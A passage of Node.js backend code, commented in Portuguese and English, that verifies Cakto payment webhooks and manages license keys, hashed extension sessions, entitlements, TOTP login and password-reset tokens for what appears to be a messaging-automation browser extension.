  // seguinte ainda exige status pago, BRL e preço-base exato do plano.
  const exactNames = [purchase.productName, purchase.offerName].map(normalizePlanName).filter(Boolean);
  if (exactNames.length) {
    const matching = allPlans.filter(plan => {
      const allowed = [plan.name, plan.shortName].map(normalizePlanName).filter(Boolean);
      return exactNames.some(name => allowed.includes(name));
    });
    // Names are not a safe selector when historic and v2 contracts collide.
    // Require a distinct configured offer/product ID or matching checkout.
    if (matching.length === 1) return matching[0];
  }
  return null;
}

function maskLicenseCode(code) {
  const value = safeScalar(code, 128);
  if (!value) return '';
  const digest = crypto.createHash('sha256').update(value, 'utf8').digest('hex').slice(0, 12);
  return `key#${digest}`;
}

function maskTransactionId(value) {
  const tx = safeScalar(value, 180);
  if (!tx) return '';
  return `tx#${crypto.createHash('sha256').update(tx, 'utf8').digest('hex').slice(0, 12)}`;
}

function caktoEventKey(txId) {
  const tx = safeScalar(txId, 180);
  if (!tx) return '';
  const digest = crypto.createHash('sha256').update(`cakto:event\0${tx}`, 'utf8').digest('hex');
  // Compatibilidade intencional: o namespace histórico permanece
  // `purchase_approved` para que purchase_approved + subscription_renewed
  // do MESMO pedido compartilhem a mesma chave idempotente e nunca somem
  // duas renovações. Trocar o prefixo quebraria dedup/requeue de filas antigas.
  return `cakto:purchase_approved:evt_${digest}`;
}

function caktoQueueRef(eventKey) {
  const key = safeScalar(eventKey, 220);
  if (!key) return '';
  return `cq_${crypto.createHash('sha256').update(key, 'utf8').digest('hex').slice(0, 24)}`;
}

function verifyCaktoSignature(rawBody, timestampHeader, signatureHeader, secret = CAKTO_WEBHOOK_SECRET, nowMs = Date.now()) {
  if (!secret) return { ok: false, status: 503, error: 'webhook_disabled' };
  const tsText = String(timestampHeader || '').trim();
  if (!/^\d{9,12}$/.test(tsText)) return { ok: false, status: 401, error: 'signature_timestamp_missing' };
  const ts = Number(tsText);
  if (!Number.isFinite(ts) || Math.abs((Number(nowMs) / 1000) - ts) > CAKTO_SIGNATURE_TOLERANCE_SECONDS) {
    return { ok: false, status: 401, error: 'signature_timestamp_stale' };
  }
  const signatures = String(signatureHeader || '').split(',').map(v => v.trim()).filter(Boolean);
  const v1 = signatures.find(v => /^v1=[a-f0-9]{64}$/i.test(v));
  if (!v1) return { ok: false, status: 401, error: 'signature_missing' };
  const bodyBuffer = Buffer.isBuffer(rawBody) ? rawBody : Buffer.from(String(rawBody == null ? '' : rawBody), 'utf8');
  const expected = crypto.createHmac('sha256', secret).update(`${tsText}.`, 'utf8').update(bodyBuffer).digest('hex');
  const a = Buffer.from(v1.toLowerCase(), 'utf8');
  const b = Buffer.from(`v1=${expected}`, 'utf8');
  const ok = a.length === b.length && crypto.timingSafeEqual(a, b);
  return ok ? { ok: true } : { ok: false, status: 401, error: 'signature_invalid' };
}

function validateCaktoCommercialIntegrity(purchase, plan) {
  if (!purchase || !isCaktoPaidEntitlementEvent(purchase.event)) return { ok: true };
  if (purchase.status !== 'paid') return { ok: false, status: 422, error: 'purchase_not_paid' };
  if (!plan) return { ok: false, status: 422, error: 'unmapped_plan' };
  if (purchase.offerType && purchase.offerType !== 'main') return { ok: false, status: 422, error: 'unsupported_offer_type' };
  if (purchase.currency && purchase.currency !== 'BRL') return { ok: false, status: 422, error: 'currency_mismatch' };
  if (plan.offerId && (!purchase.offerId || !safeCompare(purchase.offerId, plan.offerId))) return { ok: false, status: 422, error: 'offer_mismatch' };
  if (plan.productId && (!purchase.productId || !safeCompare(purchase.productId, plan.productId))) return { ok: false, status: 422, error: 'product_mismatch' };

  const expected = Number(plan.price);
  const authoritativeBase = Number.isFinite(purchase.baseAmount) ? purchase.baseAmount : purchase.offerPrice;
  if (!Number.isFinite(authoritativeBase) || !Number.isFinite(expected) || Math.abs(authoritativeBase - expected) > 0.011) {
    return { ok: false, status: 422, error: 'price_mismatch' };
  }
  // `amount` é o valor cobrado; juros/taxas adicionais existem em campos
  // separados no contrato Cakto. Não inferimos uma equação não documentada
  // entre eles: exigimos presença, finitude e não-negatividade, enquanto o
  // preço comercial canônico fica vinculado por baseAmount/offer.price.
  if (!Number.isFinite(purchase.amount) || purchase.amount < 0) {
    return { ok: false, status: 422, error: 'amount_invalid' };
  }
  // `discount` chega como decimal textual. Quando presente, precisa ser um
  // desconto plausível sobre o preço-base; cupons legítimos continuam aceitos.
  if (Number.isFinite(purchase.discount) && (purchase.discount < 0 || purchase.discount > authoritativeBase + 0.011)) {
    return { ok: false, status: 422, error: 'discount_invalid' };
  }
  return { ok: true };
}

function maskEmail(email) {
  const value = safeScalar(email, 160).toLowerCase();
  const at = value.indexOf('@');
  if (at <= 0) return value ? '***' : '';
  const local = value.slice(0, at);
  const visible = local.length > 1 ? local[0] : '*';
  return `${visible}***${value.slice(at)}`;
}

function maskPhone(phone) {
  const digits = safeScalar(phone, 40).replace(/\D/g, '');
  return digits ? `***${digits.slice(-4)}` : '';
}

function safeLocalRedirect(value, fallback = '') {
  if (typeof value !== 'string') return fallback;
  const candidate = value.trim().slice(0, 200);
  if (!candidate.startsWith('/') || candidate.startsWith('//') || candidate.includes('\\') || /[\u0000-\u001f]/.test(candidate)) return fallback;
  try {
    const base = new URL('https://zvm.local');
    const parsed = new URL(candidate, base);
    return parsed.origin === base.origin ? `${parsed.pathname}${parsed.search}${parsed.hash}` : fallback;
  } catch { return fallback; }
}

function getVerifyRedirect(isLoggedIn) {
  return isLoggedIn ? '/cliente' : '/cliente?redir=/cliente';
}

function generateCode() {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  const limit = 256 - (256 % chars.length); // rejection threshold to avoid modulo bias
  const seg = () => {
    let result = '';
    while (result.length < 5) {
      const bytes = crypto.randomBytes(10);
      for (let i = 0; i < bytes.length && result.length < 5; i++) {
        if (bytes[i] < limit) result += chars[bytes[i] % chars.length];
      }
    }
    return result;
  };
  return `zv-${seg()}-${seg()}-${seg()}`;
}
function generateToken() { return crypto.randomBytes(32).toString('hex'); }

// Token de reset de senha do portal standalone: o valor UTILIZÁVEL (o que
// destrava a troca de senha) nunca fica em claro no Mongo. O e-mail recebe
// o rawToken; o banco guarda só o hash. Um vazamento de leitura do Mongo
// (backup exposto, dump, acesso indevido a um admin do banco) deixa de ser
// um caminho direto de account takeover — o hash sozinho não autentica nada.
function hashResetToken(rawToken) {
  return crypto.createHash('sha256').update(String(rawToken)).digest('hex');
}

// ── Extension API V4: sessão opaca + entitlement server-authoritative ───
// O token utilizável existe apenas na resposta HTTP e na memória transitória
// desta chamada. `extension_sessions._id` recebe exclusivamente SHA-256(token),
// portanto uma leitura indevida do Mongo não entrega um bearer reutilizável.
const EXTENSION_SESSION_COLLECTION = 'extension_sessions';
const EXTENSION_SESSION_TTL_MS = 24 * 60 * 60 * 1000;
const EXTENSION_ENTITLEMENT_LEASE_MS = 15 * 60 * 1000;
const EXTENSION_FREE_CAPABILITIES = Object.freeze([
  'account.manage',
  'academy.basic',
  'dashboard.basic',
  'items.manage',
  'items.preview',
  'laboratory.preview',
  'personalization.manage',
]);
const EXTENSION_LICENSED_CAPABILITIES = Object.freeze([
  ...EXTENSION_FREE_CAPABILITIES,
  'academy.ai',
  'ai.agents',
  'ai.knowledge',
  'ai.memory',
  'crm.use',
  'disparos.execute',
  'export.contacts',
  'flows.execute',
  'flows.manage',
  'followup.execute',
  'followup.manage',
  'funnels.execute',
  'funnels.manage',
  'groups.send',
  'integrations.manage',
  'items.send',
  'items.schedule',
  'quickReply.send',
  'laboratory.realSend',
  'laboratory.aiTest',
]);
const _extensionSessionIndexedDbs = new WeakSet();
const _extensionSessionIndexPending = new WeakMap();
const ZVM_EXTENSION_AUTH_DB_TIMEOUT_MS = 3200;

function extensionNow(deps = {}) {
  const value = typeof deps.now === 'function' ? deps.now() : deps.now;
  const date = value instanceof Date ? new Date(value) : new Date(value == null ? Date.now() : value);
  return Number.isFinite(date.getTime()) ? date : new Date();
}

function hashExtensionSessionToken(rawToken) {
  return crypto.createHash('sha256').update(String(rawToken || ''), 'utf8').digest('hex');
}

function extensionSubject(type, stableId) {
  return {
    type,
    id: crypto.createHash('sha256').update(`zvm-extension:${type}:${String(stableId || '')}`, 'utf8').digest('hex'),
  };
}

function extensionLicenseIsUsable(keyRecord, nowValue = Date.now()) {
  if (!keyRecord || keyRecord.active !== true) return false;
  if (!keyRecord.expiresAt) return true;
  const expiresAt = new Date(keyRecord.expiresAt).getTime();
  return Number.isFinite(expiresAt) && expiresAt > new Date(nowValue).getTime();
}

function extensionDevAccessAllowed(keyCode, keyRecord) {
  if (!keyCode || !keyRecord || keyRecord.active !== true) return false;
  if (keyRecord.devAccess === true) return true;
  const keyHash = crypto.createHash('sha256').update(String(keyCode), 'utf8').digest('hex');
  return ZVM_DEV_LICENSE_KEY_HASHES.has(keyHash);
}

function buildExtensionEntitlement({ keyCode = null, keyRecord = null, now = Date.now() } = {}) {
  const nowDate = now instanceof Date ? new Date(now) : new Date(now);
  const nowMs = Number.isFinite(nowDate.getTime()) ? nowDate.getTime() : Date.now();
  const licensed = !!keyCode && extensionLicenseIsUsable(keyRecord, nowMs);
  const capabilities = [...(licensed ? EXTENSION_LICENSED_CAPABILITIES : EXTENSION_FREE_CAPABILITIES)].sort();
  const licenseExpiryMs = licensed && keyRecord.expiresAt ? new Date(keyRecord.expiresAt).getTime() : null;
  const leaseExpiryMs = Number.isFinite(licenseExpiryMs)
    ? Math.min(nowMs + EXTENSION_ENTITLEMENT_LEASE_MS, licenseExpiryMs)
    : nowMs + EXTENSION_ENTITLEMENT_LEASE_MS;
  const tier = licensed ? 'paid' : 'free';
  const rawPlanId = licensed ? String(keyRecord.plan_id || keyRecord.planId || '').trim() : '';
  const commercialPlan = licensed ? (ZVM_PAYMENT_PLANS[rawPlanId.toLowerCase()] || null) : null;
  const planId = licensed ? (rawPlanId || 'ZV_PRO') : FREE_PLAN_ID;
  // Legacy/admin-created keys predate explicit plan metadata. Their historical
  // contract was PRO, so keep that fallback instead of exposing a generic
  // "Licenciado" label that loses useful license information.
  const planName = licensed ? String(keyRecord.planName || commercialPlan?.shortName || commercialPlan?.name || 'Pro') : 'Gratuito';
  const rawMaxUses = licensed && typeof keyRecord.maxUses === 'number' ? keyRecord.maxUses : null;
  const accessUnlimited = rawMaxUses === -1;
  const accessLimit = licensed && Number.isInteger(rawMaxUses) && rawMaxUses >= 0 ? rawMaxUses : null;
  const accessUsed = licensed
    ? (Array.isArray(keyRecord.phones) ? keyRecord.phones.length : Math.max(0, Number(keyRecord.uses) || 0))
    : 0;
  const backupOwnerId = licensed ? String(keyRecord.ownerId || 'zv-owner') : '';
  const backupOwnerHash = backupOwnerId
    ? crypto.createHash('sha256').update(`ext:backup-owner:v1:${backupOwnerId}`, 'utf8').digest('hex')
    : null;
  const backupLegacyOwnerHash = backupOwnerId
    ? crypto.createHash('sha256').update(`zv:backup-owner:v1:${backupOwnerId}`, 'utf8').digest('hex')
    : null;
  const revisionInput = JSON.stringify({
    tier,
    planId,
    planName,
    accessLimit,
    accessUsed,
    accessUnlimited,
    usageAuthority: 'server',
    capabilities,
    licenseExpiresAt: licensed ? (keyRecord.expiresAt || null) : null,
    modules: licensed ? { ...DEFAULT_MODULES, ...(keyRecord.modules || {}) } : { ...DEFAULT_MODULES },
    permissions: licensed && Array.isArray(keyRecord.permissions) ? [...keyRecord.permissions].sort() : [],
  });
  return {
    status: licensed ? 'active' : 'free',
    tier: licensed ? 'paid' : 'free',
    planId,
    planName,
    accessLimit,
    accessUsed,
    accessUnlimited,
    capabilities,
    entitlementRevision: crypto.createHash('sha256').update(revisionInput, 'utf8').digest('hex'),
    expiresAt: new Date(leaseExpiryMs).toISOString(),
    licenseExpiresAt: licensed ? (keyRecord.expiresAt || null) : null,
    backupOwnerHash,
    backupLegacyOwnerHash,
    usageAuthority: 'server',
  };
}

async function ensureExtensionSessionIndexes(db) {
  if (_extensionSessionIndexedDbs.has(db)) return;
  const inflight = _extensionSessionIndexPending.get(db);
  if (inflight) return inflight;
  const pending = (async () => {
    const collection = db.collection(EXTENSION_SESSION_COLLECTION);
    await collection.createIndex(
      { expiresAt: 1 },
      { expireAfterSeconds: 0, name: 'extension_sessions_ttl', timeoutMS: ZVM_EXTENSION_AUTH_DB_TIMEOUT_MS }
    );
    await collection.createIndex(
      { 'subject.id': 1, revokedAt: 1 },
      { name: 'extension_sessions_subject', timeoutMS: ZVM_EXTENSION_AUTH_DB_TIMEOUT_MS }
    );
    _extensionSessionIndexedDbs.add(db);
  })();
  _extensionSessionIndexPending.set(db, pending);
  try { await pending; }
  finally {
    if (_extensionSessionIndexPending.get(db) === pending) {
      _extensionSessionIndexPending.delete(db);
    }
  }
}

function publicExtensionSession(doc, rawToken) {
  return {
    token: rawToken,
    sessionId: doc.sessionId,
    subject: { ...doc.subject },
    authMethod: doc.authMethod,
    expiresAt: new Date(doc.expiresAt).toISOString(),
  };
}

function extensionSessionSuccess(rawToken, sessionDoc, entitlement) {
  const session = publicExtensionSession(sessionDoc, rawToken);
  return {
    ok: true,
    session,
    entitlement: {
      subject: { ...session.subject },
      authMethod: session.authMethod,
      status: entitlement.status,
      tier: entitlement.tier,
      entitlementRevision: entitlement.entitlementRevision,
      capabilities: [...entitlement.capabilities],
      expiresAt: entitlement.expiresAt,
      licenseExpiresAt: entitlement.licenseExpiresAt || null,
      planId: entitlement.planId,
      planName: entitlement.planName,
      accessLimit: entitlement.accessLimit,
      accessUsed: entitlement.accessUsed,
      accessUnlimited: entitlement.accessUnlimited === true,
      usageAuthority: entitlement.usageAuthority || 'server',
      backupOwnerHash: entitlement.backupOwnerHash || null,
      backupLegacyOwnerHash: entitlement.backupLegacyOwnerHash || null,
    },
  };
}

function extensionSessionSecurityFields(buildClient) {
  const protocol = Number(buildClient?.securityProtocol) === 2 ? 2 : 1;
  const signedDev = protocol === 2 && buildClient?.signedDev === true && String(buildClient?.channel || '').toLowerCase() === 'dev';
  let devAttestation = null;
  if (signedDev && buildClient?.devAttestation && typeof buildClient.devAttestation === 'object') {
    try { devAttestation = JSON.parse(JSON.stringify(buildClient.devAttestation)); } catch (_) { devAttestation = null; }
  }
  return {
    securityProtocol: protocol,
    buildId: protocol === 2 ? String(buildClient?.buildId || '').toLowerCase() || null : null,
    channel: protocol === 2 ? String(buildClient?.channel || '').toLowerCase() || null : null,
    profile: protocol === 2 ? String(buildClient?.profile || '').toLowerCase() || null : null,
    extensionVersion: String(buildClient?.extensionVersion || '') || null,
    extensionId: String(buildClient?.extensionId || '').toLowerCase() || null,
    buildFingerprint: String(buildClient?.buildFingerprint || '').toLowerCase() || null,
    installationId: protocol === 2 ? String(buildClient?.installationId || '') || null : null,
    developmentAuthorized: buildClient?.developmentAuthorized === true,
    signedDev,
    devAttestation,
  };
}

async function createExtensionSession(descriptor, deps = {}) {
  const db = deps.db || await getMongoDb();
  const now = extensionNow(deps);
  await ensureExtensionSessionIndexes(db);
  for (let attempt = 0; attempt < 3; attempt++) {
    const rawToken = (deps.generateToken || generateToken)();
    const tokenHash = hashExtensionSessionToken(rawToken);
    const signedDev = Number(descriptor.securityProtocol) === 2 && descriptor.signedDev === true && String(descriptor.channel || '').toLowerCase() === 'dev';
    let devAttestation = null;
    let sessionExpiryMs = now.getTime() + EXTENSION_SESSION_TTL_MS;
    if (signedDev) {
      if (!descriptor.devAttestation || typeof descriptor.devAttestation !== 'object') throw new Error('DEV_BUILD_ATTESTATION_INVALID');
      try { devAttestation = JSON.parse(JSON.stringify(descriptor.devAttestation)); } catch (_) { throw new Error('DEV_BUILD_ATTESTATION_INVALID'); }
      const buildExpiryMs = Date.parse(String(devAttestation.expiresAt || ''));
      if (!Number.isFinite(buildExpiryMs) || buildExpiryMs <= now.getTime()) throw new Error('DEV_BUILD_EXPIRED');
      const devTtlMs = Number(ZVM_DEV_SIGNING_CONFIG?.sessionTtlMs || 12 * 60 * 60 * 1000);
      sessionExpiryMs = Math.min(now.getTime() + devTtlMs, buildExpiryMs);
    }
    const doc = {
      _id: tokenHash,
      sessionId: crypto.randomUUID(),
      subject: { ...descriptor.subject },
      authMethod: descriptor.authMethod,
      accountEmail: descriptor.accountEmail || null,
      licenseKeyCode: descriptor.licenseKeyCode || null,
      phoneNumber: normalizePhone(descriptor.phoneNumber || '') || null,
      deviceIdHash: descriptor.deviceId
        ? crypto.createHash('sha256').update(String(descriptor.deviceId), 'utf8').digest('hex')
        : null,
      securityProtocol: Number(descriptor.securityProtocol) === 2 ? 2 : 1,
      buildId: Number(descriptor.securityProtocol) === 2 && /^zvm-(?:dev|beta|production)-\d+(?:\.\d+){2,3}-s[a-f0-9]{12}$/i.test(String(descriptor.buildId || ''))
        ? String(descriptor.buildId).toLowerCase()
        : null,
      channel: Number(descriptor.securityProtocol) === 2 && ['dev','beta','production'].includes(String(descriptor.channel || '').toLowerCase())
        ? String(descriptor.channel).toLowerCase()
        : null,
      profile: Number(descriptor.securityProtocol) === 2 && ['dev','release'].includes(String(descriptor.profile || '').toLowerCase())
        ? String(descriptor.profile).toLowerCase()
        : null,
      installationIdHash: Number(descriptor.securityProtocol) === 2 && descriptor.installationId
        ? crypto.createHash('sha256').update(String(descriptor.installationId), 'utf8').digest('hex')
        : null,
      extensionVersion: safeScalar(descriptor.extensionVersion, 24) || null,
      buildFingerprint: /^[a-f0-9]{64}$/i.test(String(descriptor.buildFingerprint || '')) ? String(descriptor.buildFingerprint).toLowerCase() : null,
      extensionId: /^[a-p]{32}$/.test(String(descriptor.extensionId || '').toLowerCase()) ? String(descriptor.extensionId).toLowerCase() : null,
      developmentAuthorized: descriptor.developmentAuthorized === true,
      signedDev,
      devAttestation,
      entitlementRevision: descriptor.entitlementRevision,
      createdAt: now,
      lastSeenAt: now,
      expiresAt: new Date(sessionExpiryMs),
      revokedAt: null,
    };
    try {
      await db.collection(EXTENSION_SESSION_COLLECTION).insertOne(doc, { timeoutMS: ZVM_EXTENSION_AUTH_DB_TIMEOUT_MS });
      return { token: rawToken, doc, session: publicExtensionSession(doc, rawToken) };
    } catch (error) {
      if (error?.code !== 11000 || attempt === 2) throw error;
    }
  }
  throw new Error('extension_session_issue_failed');
}

async function readExtensionSession(rawToken, deps = {}) {
  if (!/^[a-f0-9]{64}$/i.test(String(rawToken || ''))) return { ok: false, errorCode: 'invalid_session' };
  const db = deps.db || await getMongoDb();
  const now = extensionNow(deps);
  const doc = await db.collection(EXTENSION_SESSION_COLLECTION).findOne({ _id: hashExtensionSessionToken(rawToken) });
  if (!doc) return { ok: false, errorCode: 'invalid_session' };
  if (doc.revokedAt) return { ok: false, errorCode: 'session_revoked' };
  if (!doc.expiresAt || new Date(doc.expiresAt).getTime() <= now.getTime()) {
    return { ok: false, errorCode: 'session_expired' };
  }
  return { ok: true, doc };
}

async function revokeExtensionSession(rawToken, deps = {}) {
  if (!/^[a-f0-9]{64}$/i.test(String(rawToken || ''))) return { ok: true, revoked: false };
  const db = deps.db || await getMongoDb();
  const now = extensionNow(deps);
  const result = await db.collection(EXTENSION_SESSION_COLLECTION).updateOne(
    { _id: hashExtensionSessionToken(rawToken), revokedAt: null },
    { $set: { revokedAt: now, lastSeenAt: now } }
  );
  return { ok: true, revoked: result.modifiedCount > 0 };
}

function getExtensionBearerToken(req) {
  const match = /^Bearer\s+([a-f0-9]{64})$/i.exec(String(req?.headers?.authorization || '').trim());
  return match ? match[1] : '';
}

function extensionAuthFailure(errorCode, status, extra = {}) {
  return { ok: false, errorCode, status, ...extra };
}

async function resolveExtensionAccountEntitlement(user, deps = {}) {
  const now = extensionNow(deps);
  const keyStore = deps.keyStore || keys;
  const keyCode = sanitizeId(user?.keyCode, 32);
  if (!keyCode) return { ok: true, keyCode: null, devAccess:false, entitlement: buildExtensionEntitlement({ now }) };
  const loaded = await (deps.ensureKeyLoadedEx || ensureKeyLoadedEx)(keyCode);
  if (loaded.dbError) return extensionAuthFailure('temporarily_unavailable', 503, { retryable: true });
  const keyRecord = loaded.found ? keyStore[keyCode] : null;
  if (!extensionLicenseIsUsable(keyRecord, now)) {
    return { ok: true, keyCode: null, devAccess:false, entitlement: buildExtensionEntitlement({ now }) };
  }
  return { ok: true, keyCode, devAccess:extensionDevAccessAllowed(keyCode, keyRecord), entitlement: buildExtensionEntitlement({ keyCode, keyRecord, now }) };
}

async function authenticateExtensionAccount(input, deps = {}) {
  const email = String(input?.email || '').toLowerCase().trim().slice(0, 100);
  const password = String(input?.password || '').slice(0, 128);
  if (!email || !password || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return extensionAuthFailure('invalid_credentials', 401);
  }
  const db = deps.db || await getMongoDb();
  const user = await db.collection('portal_users').findOne({ _id: email }, { timeoutMS: ZVM_EXTENSION_AUTH_DB_TIMEOUT_MS });
  const verifyPassword = deps.verifyPassword || verifyPortalPassword;
  if (!user || !await verifyPassword(password, user)) {
    return extensionAuthFailure('invalid_credentials', 401);
  }
  if (portalTotpHasSecret(user)) {
    const totpCode = String(input?.totpCode || '').trim();
    if (!totpCode) return extensionAuthFailure('mfa_required', 401, { mfaRequired: true });
    const verifyMfa = deps.verifyTotp || verifyTOTP;
    let mfaSecret;
    try { mfaSecret = portalTotpReadSecret(user, email); }
    catch (_) { return extensionAuthFailure('temporarily_unavailable', 503, { retryable: true }); }
    if (!mfaSecret || !verifyMfa(mfaSecret, totpCode)) return extensionAuthFailure('invalid_totp', 401);
    if (user.totpSecret && !user.totpSecretEnc) migratePortalTotpLegacy(db, user, email).catch(() => {});
  }
  const entitlementResult = await resolveExtensionAccountEntitlement(user, { ...deps, db });
  if (!entitlementResult.ok) return entitlementResult;
  const rehash = deps.rehashPassword || maybeRehashPortalPassword;
  try { Promise.resolve(rehash(db, email, password, user)).catch(() => {}); } catch (_) {}
  return {
    ok: true,
    subject: extensionSubject('account', email),
    accountEmail: email,
    licenseKeyCode: entitlementResult.keyCode,
    devAccess: entitlementResult.devAccess === true,
    entitlement: entitlementResult.entitlement,
  };
}

async function authorizeExtensionKeySession(input, deps = {}) {
  const keyCode = sanitizeId(input?.authKey, 32);
  const phoneNumber = normalizePhone(input?.phoneNumber || '');
  const deviceId = safeScalar(input?.deviceId, 160);
  if (!keyCode || isFreeAuthKey(keyCode) || !phoneNumber || !deviceId) {
    return extensionAuthFailure('invalid_request', 400);
  }
  const keyStore = deps.keyStore || keys;
  const loaded = await (deps.ensureKeyLoadedEx || ensureKeyLoadedEx)(keyCode);
  if (loaded.dbError) return extensionAuthFailure('temporarily_unavailable', 503, { retryable: true });
  if (!loaded.found || !keyStore[keyCode]) return extensionAuthFailure('invalid_key', 401);
  const keyRecord = keyStore[keyCode];
  if (keyRecord.active !== true) return extensionAuthFailure('key_blocked', 403);
  // Diferente do helper legado isKeyExpired(), este guard também falha
  // fechado para expiresAt malformado em vez de autenticar a chave e só
  // depois degradar silenciosamente o entitlement.
  if (!extensionLicenseIsUsable(keyRecord)) return extensionAuthFailure('key_expired', 403);
  if (!Array.isArray(keyRecord.phones)) keyRecord.phones = keyRecord.lastPhone ? [keyRecord.lastPhone] : [];
  const alreadyKnown = keyRecord.phones.some(value => normalizePhone(value) === phoneNumber);
  if (!alreadyKnown && keyRecord.phones.length >= MAX_PHONES_GLOBAL) {
    return extensionAuthFailure('phone_limit_global', 403);
  }
  const maxUses = typeof keyRecord.maxUses === 'number' ? keyRecord.maxUses : MAX_USES;
  const claim = await (deps.claimPhoneSlot || claimPhoneSlotAtomic)(keyCode, phoneNumber, maxUses);
  if (claim.status === 'limit_reached') return extensionAuthFailure('phone_limit', 403);
  if (keyRecord.expireDuration && !keyRecord.expiresAt) {
    const activated = await (deps.activateDeferredKey || activateDeferredKey)(keyCode);
    if (!activated) return extensionAuthFailure('activation_failed', 503, { retryable: true });
  }
  const now = extensionNow(deps);
  const entitlement = buildExtensionEntitlement({ keyCode, keyRecord: keyStore[keyCode], now });
  return {
    ok: true,
    subject: extensionSubject('license', keyCode),
    licenseKeyCode: keyCode,
    phoneNumber,
    deviceId,
    devAccess: extensionDevAccessAllowed(keyCode, keyStore[keyCode]),
    entitlement,
    newlyClaimed: claim.status === 'claimed',
  };
}

async function refreshExtensionSession(rawToken, deps = {}) {
  const db = deps.db || await getMongoDb();
  const now = extensionNow(deps);
  const current = await readExtensionSession(rawToken, { ...deps, db, now });
  if (!current.ok) return extensionAuthFailure(current.errorCode, 401);
  const doc = current.doc;
  let buildDecision;
  if (typeof deps.storedSessionDecision === 'function') {
    buildDecision = deps.storedSessionDecision(doc);
  } else if (typeof deps.buildDenied === 'function' && deps.buildDenied(doc.extensionVersion, doc.buildFingerprint, doc)) {
    buildDecision = { ok:false, code:'BUILD_REVOKED' };
  } else if (typeof deps.storedSessionAllowed === 'function') {
    buildDecision = deps.storedSessionAllowed(doc) ? { ok:true } : { ok:false, code:'BUILD_NOT_ALLOWED' };
  } else {
    buildDecision = zvmSecurityStoredSessionDecision(doc);
  }
  if (!buildDecision.ok) {
    await revokeExtensionSession(rawToken, { ...deps, db, now });
    return extensionAuthFailure(buildDecision.code || 'BUILD_NOT_ALLOWED', zvmSecurityClientErrorStatus(buildDecision.code || 'BUILD_NOT_ALLOWED'));
  }
  if (Number(doc.securityProtocol || 1) === 2 && deps.requireCurrentClientSecurity === true && (!deps.clientSecurity || typeof deps.clientSecurity !== 'object')) {
    await revokeExtensionSession(rawToken, { ...deps, db, now });
    return extensionAuthFailure('SECURITY_CLIENT_REQUIRED', 400);
  }
  if (Number(doc.securityProtocol || 1) === 2 && deps.clientSecurity && typeof deps.clientSecurity === 'object') {
    const checkCurrentClient = deps.checkClientShared || zvmSecurityCheckClientShared;
    const currentSecurity = await checkCurrentClient(deps.clientSecurity, { licenseKey: doc.licenseKeyCode || '' });
    if (!currentSecurity.ok) {
      await revokeExtensionSession(rawToken, { ...deps, db, now });
      return extensionAuthFailure(currentSecurity.code || 'BUILD_NOT_ALLOWED', zvmSecurityClientErrorStatus(currentSecurity.code || 'BUILD_NOT_ALLOWED'));
    }
    const installationIdHash = currentSecurity.installationId
      ? crypto.createHash('sha256').update(String(currentSecurity.installationId), 'utf8').digest('hex')
      : '';
    const sameIdentity = Number(currentSecurity.securityProtocol) === 2 &&
      String(currentSecurity.buildId || '').toLowerCase() === String(doc.buildId || '').toLowerCase() &&
      String(currentSecurity.channel || '').toLowerCase() === String(doc.channel || '').toLowerCase() &&
      String(currentSecurity.profile || '').toLowerCase() === String(doc.profile || '').toLowerCase() &&
      String(currentSecurity.extensionVersion || '') === String(doc.extensionVersion || '') &&
      String(currentSecurity.extensionId || '').toLowerCase() === String(doc.extensionId || '').toLowerCase() &&
      String(currentSecurity.buildFingerprint || '').toLowerCase() === String(doc.buildFingerprint || '').toLowerCase() &&
      installationIdHash === String(doc.installationIdHash || '').toLowerCase();
    if (!sameIdentity) {
      await revokeExtensionSession(rawToken, { ...deps, db, now });
      return extensionAuthFailure('BUILD_NOT_ALLOWED', 403);
    }
  }
  let entitlementResult;
  let licenseKeyCode = doc.licenseKeyCode || null;
  if (doc.authMethod === 'password') {
    const user = await db.collection('portal_users').findOne({ _id: doc.accountEmail });
    if (!user) {
      await revokeExtensionSession(rawToken, { ...deps, db, now });
      return extensionAuthFailure('subject_not_found', 401);
    }
    entitlementResult = await resolveExtensionAccountEntitlement(user, { ...deps, db, now });
    if (!entitlementResult.ok) return entitlementResult;
    licenseKeyCode = entitlementResult.keyCode;
  } else if (doc.authMethod === 'license_key') {
    const keyStore = deps.keyStore || keys;
    const loaded = await (deps.ensureKeyLoadedEx || ensureKeyLoadedEx)(doc.licenseKeyCode);
    if (loaded.dbError) return extensionAuthFailure('temporarily_unavailable', 503, { retryable: true });
    const keyRecord = loaded.found ? keyStore[doc.licenseKeyCode] : null;
    const phoneStillAllowed = !doc.phoneNumber || (Array.isArray(keyRecord?.phones)
      && keyRecord.phones.some(value => normalizePhone(value) === doc.phoneNumber));
    if (!extensionLicenseIsUsable(keyRecord, now) || !phoneStillAllowed) {
      await revokeExtensionSession(rawToken, { ...deps, db, now });
      return extensionAuthFailure('entitlement_revoked', 403);
    }
    entitlementResult = {
      ok: true,
      keyCode: doc.licenseKeyCode,
      devAccess: extensionDevAccessAllowed(doc.licenseKeyCode, keyRecord),
      entitlement: buildExtensionEntitlement({ keyCode: doc.licenseKeyCode, keyRecord, now }),
    };
  } else {
    await revokeExtensionSession(rawToken, { ...deps, db, now });
    return extensionAuthFailure('invalid_session', 401);
  }
  if (doc.signedDev === true && entitlementResult.devAccess !== true) {
    await revokeExtensionSession(rawToken, { ...deps, db, now });
    return extensionAuthFailure('DEV_ACCESS_REQUIRED', 403);
  }
  await db.collection(EXTENSION_SESSION_COLLECTION).updateOne(
    { _id: doc._id, revokedAt: null },
    { $set: {
      lastSeenAt: now,
      licenseKeyCode: licenseKeyCode || null,
      entitlementRevision: entitlementResult.entitlement.entitlementRevision,
    } }
  );
  return {
    ok: true,
    sessionDoc: doc,
    entitlement: entitlementResult.entitlement,
  };
}

// Reset tokens atuais são persistidos somente pelo SHA-256. O fallback
// histórico para token cru foi removido: a janela de validade daquele formato
// era de 1h e já expirou há muito tempo. O raw token nunca vira chave de busca.
async function resolveResetToken(db, rawToken) {
  const matchedId = hashResetToken(rawToken);
  const rec = await db.collection('password_resets').findOne({ _id: matchedId });
  if (!rec || new Date() > new Date(rec.expiresAt)) return { rec: null, matchedId: null };
  return { rec, matchedId };
}

async function claimResetToken(db, rawToken, now = new Date()) {
  const at = new Date(now);
  const matchedId = hashResetToken(rawToken);
  const rec = await db.collection('password_resets').findOneAndUpdate(
    { _id: matchedId, expiresAt: { $gt: at }, consumedAt: { $exists: false } },
    { $set: { consumedAt: at } },
    { returnDocument: 'before' }
  );
  return rec ? { rec, matchedId } : { rec: null, matchedId: null };
}

